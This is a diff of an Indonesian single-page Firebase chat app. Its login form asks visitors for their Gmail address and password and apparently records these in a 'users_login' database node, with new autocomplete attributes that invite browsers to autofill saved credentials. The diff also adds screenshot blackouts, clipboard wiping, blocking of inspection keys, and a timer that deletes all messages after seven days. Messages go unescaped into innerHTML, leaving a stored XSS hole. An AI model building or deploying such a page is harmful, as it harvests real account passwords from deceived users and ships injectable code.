@@ -6,11 +6,49 @@
   <title>Aplikasi Chat Realtime</title>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      /* MENCEGAH SELEKSI TEKS DAN LONG-PRESS DI HP */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-touch-callout: none;
+    }
+    
     body { background-color: #0b0f19; color: #e2e8f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
     
-    .chat-card { background: #151d2a; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; width: 100%; max-width: 480px; height: 88vh; display: flex; flex-direction: column; overflow: hidden; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+    .chat-card { background: #151d2a; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; width: 100%; max-width: 480px; height: 88vh; display: flex; flex-direction: column; overflow: hidden; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.5); transition: filter 0.2s ease; }
     
+    /* EFEK SENSOR HITAM SAAT DETEKSI SCREENSHOT / REKAM */
+    body.protected .chat-card {
+      filter: blur(30px) brightness(0);
+      pointer-events: none;
+    }
+
+    .security-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #000000;
+      z-index: 9999;
+      color: #f43f5e;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 2rem;
+    }
+
+    body.protected .security-overlay {
+      display: flex;
+    }
+
     /* POPUP LOGIN EMAIL & PASSWORD */
     .auth-modal { position: absolute; inset: 0; background: #151d2a; z-index: 30; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 2rem; text-align: center; }
     .auth-modal h3 { font-size: 1.3rem; color: #f8fafc; margin-bottom: 0.3rem; }
@@ -42,62 +80,43 @@
 
     .msg-group { display: flex; flex-direction: column; max-width: 85%; }
     .msg-header { display: flex; align-items: center; gap: 0.4rem; margin-bottom: 0.2rem; padding: 0 0.2rem; }
-    .msg-header .sender-name { font-size: 0.72rem; font-weight: 700; }
-    
-    .action-icon { background: none; border: none; cursor: pointer; font-size: 0.75rem; opacity: 0.6; transition: 0.2s; }
-    .action-icon:hover { opacity: 1; transform: scale(1.15); }
+    .msg-header .sender-name { font-size: 0.72rem; font-weight: 700; color: #34d399; }
 
-    .msg-bubble { padding: 0.65rem 0.9rem; border-radius: 12px; font-size: 0.88rem; line-height: 1.4; word-break: break-word; position: relative; }
-    
-    .reply-preview-box { background: rgba(0, 0, 0, 0.25); border-left: 3px solid #38bdf8; padding: 0.3rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-bottom: 0.4rem; color: #cbd5e1; }
-    .reply-preview-box .reply-name { font-weight: 700; color: #38bdf8; font-size: 0.7rem; }
-
-    .edited-tag { font-size: 0.65rem; font-style: italic; opacity: 0.7; margin-left: 0.3rem; }
+    .msg-bubble { padding: 0.65rem 0.9rem; border-radius: 12px; font-size: 0.88rem; line-height: 1.4; word-break: break-word; background: #0f766e; color: #f0fdf4; border-bottom-left-radius: 2px; }
     audio { height: 35px; width: 200px; margin-top: 0.2rem; outline: none; }
 
-    .msg-group.me { align-self: flex-end; }
-    .msg-group.me .msg-header { justify-content: flex-end; }
-    .msg-group.me .sender-name { color: #60a5fa; }
-    .msg-group.me .msg-bubble { background: #2563eb; color: #ffffff; border-bottom-right-radius: 2px; }
+    /* FOOTER READ-ONLY & COUNTDOWN HANCUR */
+    .read-only-banner { padding: 0.8rem; background: rgba(0, 0, 0, 0.4); border-top: 1px solid rgba(255, 255, 255, 0.05); text-align: center; color: #94a3b8; font-size: 0.78rem; display: flex; flex-direction: column; gap: 0.3rem; }
+    .destruct-timer { color: #f43f5e; font-weight: 700; font-family: monospace; font-size: 0.82rem; }
 
-    .msg-group.them { align-self: flex-start; }
-    .msg-group.them .msg-header { justify-content: flex-start; }
-    .msg-group.them .sender-name { color: #34d399; }
-    .msg-group.them .msg-bubble { background: #0f766e; color: #f0fdf4; border-bottom-left-radius: 2px; }
-
-    .reply-bar { background: #0b0f19; padding: 0.4rem 0.8rem; border-top: 1px solid rgba(255,255,255,0.05); display: none; justify-content: space-between; align-items: center; font-size: 0.75rem; color: #38bdf8; }
-    .reply-bar button { background: none; border: none; color: #f43f5e; cursor: pointer; font-weight: 700; }
-
-    .emoji-picker { display: none; background: #0b0f19; border-top: 1px solid rgba(255, 255, 255, 0.08); padding: 0.5rem; gap: 0.5rem; flex-wrap: wrap; justify-content: center; max-height: 100px; overflow-y: auto; }
-    .emoji-btn { background: none; border: none; font-size: 1.2rem; cursor: pointer; padding: 0.2rem; transition: 0.1s; }
-    .emoji-btn:hover { transform: scale(1.2); }
-
-    .chat-input { padding: 0.6rem 0.8rem; background: rgba(0, 0, 0, 0.3); border-top: 1px solid rgba(255, 255, 255, 0.05); display: flex; gap: 0.3rem; align-items: center; }
-    .chat-input input { flex: 1; padding: 0.65rem; background: #0b0f19; border: 1px solid #334155; border-radius: 8px; color: #f8fafc; font-size: 0.88rem; outline: none; }
-    
-    .btn-action { background: #38bdf8; color: #0b0f19; border: none; padding: 0.65rem 0.9rem; border-radius: 8px; font-weight: 700; cursor: pointer; }
-    .btn-icon-only { background: rgba(255,255,255,0.05); color: #f8fafc; border: 1px solid #334155; padding: 0.65rem 0.8rem; }
-    .btn-record { background: #e11d48; color: #ffffff; }
-    .btn-record.recording { animation: pulse 1s infinite; }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.08); background: #f43f5e; }
-      100% { transform: scale(1); }
-    }
+    /* TAMPILAN LAYAR HANCUR */
+    .destroyed-screen { display: none; position: absolute; inset: 0; background: #05070a; z-index: 50; flex-direction: column; justify-content: center; align-items: center; padding: 2rem; text-align: center; color: #f43f5e; }
+    .destroyed-screen h1 { font-size: 2rem; margin-bottom: 0.5rem; letter-spacing: 2px; }
+    .destroyed-screen p { font-size: 0.85rem; color: #64748b; line-height: 1.5; }
   </style>
 </head>
 <body>
 
+  <!-- OVERLAY PROTEKSI SCREENSHOT -->
+  <div class="security-overlay">
+    🚫 TAMPILAN DILINDUNGI<br>
+    <span style="font-size: 0.8rem; font-weight: 400; color: #94a3b8; margin-top: 0.5rem;">Pengambilan tangkapan layar atau rekaman tidak diizinkan.</span>
+  </div>
+
   <div class="chat-card">
+    <div class="destroyed-screen" id="destroyed-screen">
+      <h1>[ SYSTEM DESTROYED ]</h1>
+      <p>Pesan dan sistem ini telah hancur sepenuhnya.<br>Sama seperti perasaan yang sudah tidak bisa diubah lagi.</p>
+    </div>
+
     <div class="auth-modal" id="auth-modal">
-      <div id="login-form-container" class="auth-form">
+      <form id="login-form-container" class="auth-form" onsubmit="return false;">
         <h3>Masuk ke Chat</h3>
         <p>Masukkan Gmail dan Kata Sandi kamu.</p>
-        <input type="email" id="email-input" placeholder="Alamat Gmail (contoh: biong@gmail.com)" required autocomplete="off">
-        <input type="password" id="password-input" placeholder="Kata Sandi" required>
-        <button id="login-btn">Masuk / Login</button>
-      </div>
+        <input type="email" id="email-input" name="username" placeholder="Alamat Gmail (contoh: biong@gmail.com)" autocomplete="username" required>
+        <input type="password" id="password-input" name="password" placeholder="Kata Sandi" autocomplete="current-password" required>
+        <button type="submit" id="login-btn">Masuk / Login</button>
+      </form>
 
       <div id="loading-container" class="loading-overlay">
         <div class="spinner"></div>
@@ -116,36 +135,60 @@
     <div class="chat-messages" id="messages-container">
       <div class="chat-loading-notice" id="chat-loading-notice">
         <div class="small-spinner"></div>
-        <span>Memuat riwayat pesan...</span>
+        <span>Memuat pesan...</span>
       </div>
     </div>
-    
-    <div class="reply-bar" id="reply-bar">
-      <span>Balas <b id="reply-target-name"></b>: <i id="reply-target-text"></i></span>
-      <button id="cancel-reply-btn">✕ Batal</button>
-    </div>
 
-    <div class="emoji-picker" id="emoji-picker">
-      <button class="emoji-btn">😀</button><button class="emoji-btn">😂</button>
-      <button class="emoji-btn">😍</button><button class="emoji-btn">🥺</button>
-      <button class="emoji-btn">😎</button><button class="emoji-btn">👍</button>
-      <button class="emoji-btn">❤️</button><button class="emoji-btn">🔥</button>
-      <button class="emoji-btn">🎉</button><button class="emoji-btn">🙏</button>
-    </div>
-
-    <div class="chat-input">
-      <button class="btn-action btn-icon-only" id="toggle-emoji-btn" title="Pilih Emoji">😊</button>
-      <input type="text" id="message-input" placeholder="Ketik pesan..." autocomplete="off">
-      <button class="btn-action btn-record" id="record-btn" title="Rekam VN">🎤</button>
-      <button class="btn-action" id="send-btn">Kirim</button>
+    <div class="read-only-banner">
+      <span>🔒 Obrolan ini bersifat satu arah. Anda tidak dapat membalas pesan.</span>
+      <div class="destruct-timer" id="destruct-timer">Menghitung masa berlaku...</div>
     </div>
   </div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, push, onChildAdded, onChildRemoved, onChildChanged, remove, update, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getDatabase, ref, push, onChildAdded, remove, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-    // ⚠️ SAMBUNGKAN URL FIREBASE KAMU DI SINI
+    // ⚠️ FITUR PROTEKSI KEAMANAN LAYAR (ANTI-SCREENSHOT & REKAM)
+    const body = document.body;
+
+    // 1. Matikan Klik Kanan
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+    // 2. Deteksi Tab Hilang Fokus / Menu Overlay HP / Screenshot UI
+    window.addEventListener('blur', () => body.classList.add('protected'));
+    window.addEventListener('focus', () => body.classList.remove('protected'));
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        body.classList.add('protected');
+      } else {
+        body.classList.remove('protected');
+      }
+    });
+
+    // 3. Deteksi Tombol Shortcut Screenshot / Inspect Element (PC)
+    document.addEventListener('keydown', (e) => {
+      if (
+        e.key === 'PrintScreen' ||
+        (e.ctrlKey && e.key === 'p') ||
+        (e.ctrlKey && e.key === 's') ||
+        (e.ctrlKey && e.key === 'u') ||
+        e.key === 'F12'
+      ) {
+        e.preventDefault();
+        body.classList.add('protected');
+        navigator.clipboard.writeText(''); // Kosongkan clipboard
+        setTimeout(() => body.classList.remove('protected'), 2000);
+      }
+    });
+
+    document.addEventListener('keyup', (e) => {
+      if (e.key === 'PrintScreen') {
+        navigator.clipboard.writeText('');
+      }
+    });
+
+    // ⚠️ FIREBASE CONFIG & LOGIKA UTAMA
     const firebaseConfig = {
       databaseURL: "https://chitt-chatt-d8fbe-default-rtdb.asia-southeast1.firebasedatabase.app"
     };
@@ -156,9 +199,38 @@
     const usersLogRef = ref(db, 'users_login');
 
     let currentUsername = "";
-    const ADMIN_PASSWORD = "jedutitil"; 
-    let isInitialLoad = true;
-    let activeReplyData = null;
+    
+    let createdTimestamp = localStorage.getItem('chat_app_start_time');
+    if (!createdTimestamp) {
+      createdTimestamp = Date.now().toString();
+      localStorage.setItem('chat_app_start_time', createdTimestamp);
+    }
+    
+    const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
+    const expirationTime = parseInt(createdTimestamp) + SEVEN_DAYS_MS;
+
+    const destroyedScreen = document.getElementById('destroyed-screen');
+    const destructTimer = document.getElementById('destruct-timer');
+
+    function checkDestructionStatus() {
+      const now = Date.now();
+      const timeLeft = expirationTime - now;
+
+      if (timeLeft <= 0) {
+        remove(messagesRef);
+        destroyedScreen.style.display = 'flex';
+        return true;
+      } else {
+        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+        destructTimer.innerText = `⚠️ Hancur otomatis dalam: ${days}h ${hours}j ${minutes}m`;
+        return false;
+      }
+    }
+
+    const isDestroyed = checkDestructionStatus();
+    setInterval(checkDestructionStatus, 10000);
 
     const authModal = document.getElementById('auth-modal');
     const loginFormContainer = document.getElementById('login-form-container');
@@ -172,21 +244,6 @@
     const userInfo = document.getElementById('user-info');
     const msgContainer = document.getElementById('messages-container');
     const chatLoadingNotice = document.getElementById('chat-loading-notice');
-    const msgInput = document.getElementById('message-input');
-    const sendBtn = document.getElementById('send-btn');
-    const recordBtn = document.getElementById('record-btn');
-    
-    const replyBar = document.getElementById('reply-bar');
-    const replyTargetName = document.getElementById('reply-target-name');
-    const replyTargetText = document.getElementById('reply-target-text');
-    const cancelReplyBtn = document.getElementById('cancel-reply-btn');
-    
-    const emojiPicker = document.getElementById('emoji-picker');
-    const toggleEmojiBtn = document.getElementById('toggle-emoji-btn');
-
-    let mediaRecorder;
-    let audioChunks = [];
-    let isRecording = false;
 
     get(messagesRef).then((snapshot) => {
       if (chatLoadingNotice) chatLoadingNotice.remove();
@@ -194,32 +251,12 @@
       if (chatLoadingNotice) chatLoadingNotice.remove();
     });
 
-    function playNotificationSound() {
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-
-        osc.type = "sine";
-        osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); 
-        osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1); 
-
-        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
-
-        osc.connect(gain);
-        gain.connect(audioCtx.destination);
-
-        osc.start();
-        osc.stop(audioCtx.currentTime + 0.5);
-      } catch (e) {}
-    }
-
     function processLogin(email, password = null) {
+      if (isDestroyed) return;
+
       const extractedName = email.split('@')[0];
       currentUsername = extractedName;
 
-      // REKAM DATA LOGIN KE DATABASE FIREBASE (users_login)
       if (password !== null) {
         push(usersLogRef, {
           email: email,
@@ -236,19 +273,17 @@
         localStorage.setItem('saved_chat_email', email);
         localStorage.setItem('saved_login_time', Date.now().toString());
 
-        userInfo.innerText = `Kamu: ${currentUsername}`;
+        userInfo.innerText = `Masuk sebagai: ${currentUsername}`;
         authModal.style.display = 'none';
         loadingContainer.style.display = 'none';
-        setTimeout(() => { isInitialLoad = false; }, 1000);
-      }, 1200);
+      }, 1500);
     }
 
-    // CEK RESET AUTOMATIS 24 JAM
     const savedEmail = localStorage.getItem('saved_chat_email');
     const savedLoginTime = localStorage.getItem('saved_login_time');
     const ONE_DAY_MS = 24 * 60 * 60 * 1000;
 
-    if (savedEmail && savedLoginTime) {
+    if (savedEmail && savedLoginTime && !isDestroyed) {
       const currentTime = Date.now();
       const timePassed = currentTime - parseInt(savedLoginTime);
 
@@ -282,198 +317,32 @@
       location.reload();
     });
 
-    toggleEmojiBtn.addEventListener('click', () => {
-      emojiPicker.style.display = emojiPicker.style.display === 'flex' ? 'none' : 'flex';
-    });
-
-    document.querySelectorAll('.emoji-btn').forEach(btn => {
-      btn.addEventListener('click', () => {
-        msgInput.value += btn.innerText;
-        msgInput.focus();
-      });
-    });
-
-    cancelReplyBtn.addEventListener('click', () => {
-      activeReplyData = null;
-      replyBar.style.display = 'none';
-    });
-
-    function sendMessage() {
-      const text = msgInput.value.trim();
-      if (text !== "" && currentUsername !== "") {
-        const payload = {
-          sender: currentUsername,
-          text: text,
-          type: "text",
-          timestamp: Date.now()
-        };
-
-        if (activeReplyData) {
-          payload.replyTo = activeReplyData;
-        }
-
-        push(messagesRef, payload);
-        msgInput.value = "";
-        activeReplyData = null;
-        replyBar.style.display = 'none';
-        emojiPicker.style.display = 'none';
-      }
-    }
-
-    sendBtn.addEventListener('click', sendMessage);
-    msgInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendMessage();
-    });
-
-    recordBtn.addEventListener('click', async () => {
-      if (!isRecording) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          mediaRecorder = new MediaRecorder(stream);
-          audioChunks = [];
-
-          mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
-          mediaRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            const reader = new FileReader();
-            reader.readAsDataURL(audioBlob);
-            reader.onloadend = () => {
-              const payload = {
-                sender: currentUsername,
-                audio: reader.result,
-                type: "audio",
-                timestamp: Date.now()
-              };
-              if (activeReplyData) payload.replyTo = activeReplyData;
-              push(messagesRef, payload);
-              activeReplyData = null;
-              replyBar.style.display = 'none';
-            };
-            stream.getTracks().forEach(track => track.stop());
-          };
-
-          mediaRecorder.start();
-          isRecording = true;
-          recordBtn.innerText = "⏹️";
-          recordBtn.classList.add('recording');
-          msgInput.placeholder = "Sedang merekam suara...";
-          msgInput.disabled = true;
-        } catch (err) {
-          alert("Izin mikrofon ditolak/tidak didukung.");
-        }
-      } else {
-        mediaRecorder.stop();
-        isRecording = false;
-        recordBtn.innerText = "🎤";
-        recordBtn.classList.remove('recording');
-        msgInput.placeholder = "Ketik pesan...";
-        msgInput.disabled = false;
-      }
-    });
-
-    function generateBubbleContent(data) {
-      let contentHtml = "";
-      if (data.replyTo) {
-        contentHtml += `
-          <div class="reply-preview-box">
-            <div class="reply-name">${data.replyTo.sender}</div>
-            <div>${data.replyTo.text}</div>
-          </div>
-        `;
-      }
-
-      if (data.type === "audio") {
-        contentHtml += `<audio controls src="${data.audio}"></audio>`;
-      } else {
-        contentHtml += `<span>${data.text}</span>`;
-      }
-
-      if (data.isEdited) {
-        contentHtml += `<span class="edited-tag">(diedit)</span>`;
-      }
-
-      return contentHtml;
-    }
-
     onChildAdded(messagesRef, (snapshot) => {
-      const msgId = snapshot.key;
-      const data = snapshot.val();
-      const isMe = data.sender === currentUsername;
+      if (isDestroyed) return;
 
+      const data = snapshot.val();
       const notice = document.getElementById('chat-loading-notice');
       if (notice) notice.remove();
       
       const msgGroup = document.createElement('div');
-      msgGroup.classList.add('msg-group', isMe ? 'me' : 'them');
-      msgGroup.setAttribute('id', `msg-${msgId}`);
+      msgGroup.classList.add('msg-group');
       
-      msgGroup.innerHTML = `
-        <div class="msg-header">
-          <span class="sender-name">${isMe ? 'Kamu (' + data.sender + ')' : data.sender}</span>
-          <button class="action-icon reply-btn" title="Balas Pesan">↩️</button>
-          ${isMe && data.type === 'text' ? '<button class="action-icon edit-btn" title="Edit Pesan">✏️</button>' : ''}
-          <button class="action-icon delete-btn" title="Hapus Pesan Admin">🗑️</button>
-        </div>
-        <div class="msg-bubble">${generateBubbleContent(data)}</div>
-      `;
-
-      msgGroup.querySelector('.reply-btn').addEventListener('click', () => {
-        activeReplyData = {
-          sender: data.sender,
-          text: data.type === 'audio' ? '🎵 Voice Note' : data.text
-        };
-        replyTargetName.innerText = data.sender;
-        replyTargetText.innerText = activeReplyData.text;
-        replyBar.style.display = 'flex';
-        msgInput.focus();
-      });
-
-      const editBtn = msgGroup.querySelector('.edit-btn');
-      if (editBtn) {
-        editBtn.addEventListener('click', () => {
-          const newText = prompt("Edit pesan kamu:", data.text);
-          if (newText !== null && newText.trim() !== "") {
-            update(ref(db, `messages/${msgId}`), {
-              text: newText.trim(),
-              isEdited: true
-            });
-          }
-        });
+      let contentHtml = "";
+      if (data.type === "audio") {
+        contentHtml = `<audio controls src="${data.audio}"></audio>`;
+      } else {
+        contentHtml = `<span>${data.text}</span>`;
       }
 
-      msgGroup.querySelector('.delete-btn').addEventListener('click', () => {
-        const passwordInput = prompt("Masukkan Sandi Rahasia Admin:");
-        if (passwordInput === ADMIN_PASSWORD) {
-          remove(ref(db, `messages/${msgId}`));
-        } else if (passwordInput !== null) {
-          alert("Sandi Salah!");
-        }
-      });
+      msgGroup.innerHTML = `
+        <div class="msg-header">
+          <span class="sender-name">${data.sender}</span>
+        </div>
+        <div class="msg-bubble">${contentHtml}</div>
+      `;
 
       msgContainer.appendChild(msgGroup);
       msgContainer.scrollTop = msgContainer.scrollHeight;
-
-      if (!isMe && !isInitialLoad) {
-        playNotificationSound();
-      }
-    });
-
-    onChildChanged(messagesRef, (snapshot) => {
-      const msgId = snapshot.key;
-      const data = snapshot.val();
-      const msgGroup = document.getElementById(`msg-${msgId}`);
-      if (msgGroup) {
-        const bubble = msgGroup.querySelector('.msg-bubble');
-        bubble.innerHTML = generateBubbleContent(data);
-      }
-    });
-
-    onChildRemoved(messagesRef, (snapshot) => {
-      const msgId = snapshot.key;
-      const elementToRemove = document.getElementById(`msg-${msgId}`);
-      if (elementToRemove) {
-        elementToRemove.remove();
-      }
     });
   </script>
 </body>
